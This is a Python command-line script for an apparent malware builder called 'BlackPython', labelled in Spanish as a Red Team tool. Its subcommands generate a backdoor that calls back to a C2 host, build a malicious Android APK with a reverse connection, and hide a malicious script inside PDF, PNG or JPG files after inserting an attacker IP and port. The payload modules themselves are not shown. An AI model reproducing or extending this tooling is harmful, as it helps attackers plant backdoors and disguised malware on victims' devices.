from core.backdoor import Backdoor
from core.android import AndroidPayload
from core.binder import FileBinder
import argparse
import sys

def main():
    parser = argparse.ArgumentParser(description="BlackPython - Herramienta de Red Team")
    subparsers = parser.add_subparsers(dest="command", required=True)

    # Backdoor
    backdoor_parser = subparsers.add_parser("backdoor", help="Genera un backdoor")
    backdoor_parser.add_argument("--host", required=True, help="IP o dominio del C2")
    backdoor_parser.add_argument("--port", type=int, default=4444, help="Puerto del C2")

    # Android APK
    android_parser = subparsers.add_parser("android", help="Genera un APK malicioso")
    android_parser.add_argument("--lhost", required=True, help="Host para conexión reversa")
    android_parser.add_argument("--lport", type=int, default=4444, help="Puerto para conexión")

    # Binder mejorado
    binder_parser = subparsers.add_parser("bind", help="Camufla un payload en un archivo")
    binder_parser.add_argument("--file", required=True, help="Archivo legítimo (PDF, PNG, JPG)")
    binder_parser.add_argument("--payload", required=True, help="Script malicioso a incrustar")
    binder_parser.add_argument("--output", required=True, help="Archivo de salida")
    binder_parser.add_argument("--ip", required=True, help="IP para reemplazar en el payload")
    binder_parser.add_argument("--port", type=int, required=True, help="Puerto para reemplazar en el payload")
    binder_parser.add_argument("--debug", action="store_true", help="Modo verbose")

    args = parser.parse_args()

    if args.command == "backdoor":
        Backdoor(args.host, args.port).run()
    elif args.command == "android":
        AndroidPayload(args.lhost, args.lport).generate_apk()
    elif args.command == "bind":
        try:
            if args.debug:
                print(f"[DEBUG] Leyendo payload desde: {args.payload}")
                
            with open(args.payload, 'r') as f:
                payload_content = f.read()
                
            payload_content = payload_content.replace("TU_IP_AQUÍ", args.ip)
            payload_content = payload_content.replace("4444", str(args.port))

            if args.debug:
                print(f"[DEBUG] Payload modificado (primeras 100 chars):\n{payload_content[:100]}...")
                print(f"[DEBUG] Tipo de archivo de entrada: {args.file.split('.')[-1]}")

            if args.file.endswith(".pdf"):
                FileBinder.bind_to_pdf(args.file, payload_content, args.output, args.debug)
            elif args.file.endswith((".png", ".jpg")):
                FileBinder.bind_to_image(args.file, payload_content, args.output, args.debug)
            else:
                raise ValueError("Formato de archivo no soportado")

            if args.debug:
                print(f"[SUCCESS] Archivo infectado creado en: {args.output}")
                print(f"Tamaño original: {os.path.getsize(args.file)} bytes")
                print(f"Tamaño infectado: {os.path.getsize(args.output)} bytes")

        except Exception as e:
            print(f"[ERROR] {str(e)}", file=sys.stderr)
            if args.debug:
                import traceback
                traceback.print_exc()
            sys.exit(1)

if __name__ == "__main__":
    main()
